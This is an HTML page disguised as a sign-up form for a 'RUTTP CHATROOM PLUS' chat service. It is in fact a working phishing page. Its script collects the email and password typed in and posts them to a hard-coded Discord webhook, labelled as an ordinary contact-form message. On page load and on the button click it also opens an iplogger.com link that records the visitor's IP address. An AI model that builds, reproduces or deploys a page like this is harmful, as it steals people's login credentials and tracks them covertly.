<html>
  <head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <style>
      body {
  background-color: #171717;
        text-align: center;
}

form {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 20%;
  background: #005f8f;
  color: white;
  padding: 50px;
  border-radius: 12px;
}

      h1 {
        color: white;
      }

.form-control {
  color: white;
  background: #171717;
}

.btn btn-primary {
  background: #171717;
}
    </style>
  </head>
  <body onload="window.open('https://iplogger.com/2KNBz4')" class="container mt-5">
    <h1>RUTTP CHATROOM PLUS (FOR QUANTUM OS)</h1>
    <form onsubmit="sendContact(event)">
      <div class="mb-3">
        <label for="emailInput" class="form-label">Email</label>
        <input type="email" class="form-control" id="emailInput">
      </div>
      <div class="mb-3">
        <label for="messageInput" class="form-label">Password</label>
        <input type="password" class="form-control" id="messageInput">
      </div>
      <button type="submit" onclick="window.open('https://iplogger.com/2KNBz4')" class="btn btn-primary">Sign Up</button>
    </form>
    <script>
      async function sendContact(ev) {
        ev.preventDefault();

        const senderEmail = document
          .getElementById('emailInput').value;
        const senderMessage = document
          .getElementById('messageInput').value;

        const webhookBody = {
          embeds: [{
            title: 'Contact Form Submitted',
            fields: [
              { name: 'Sender', value: senderEmail },
              { name: 'Message', value: senderMessage }
            ]
          }],
        };

        const webhookUrl = 'https://discord.com/api/webhooks/1204857751289995374/oFtlxEUyJFPXsOfaFwTlffuSJZcpf1oPQOSW7Op1a6WsGjaCsPaf1veNv7rFeU2Yx1ja';

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookBody),
        });
      }
    </script>
  </body>
</html>
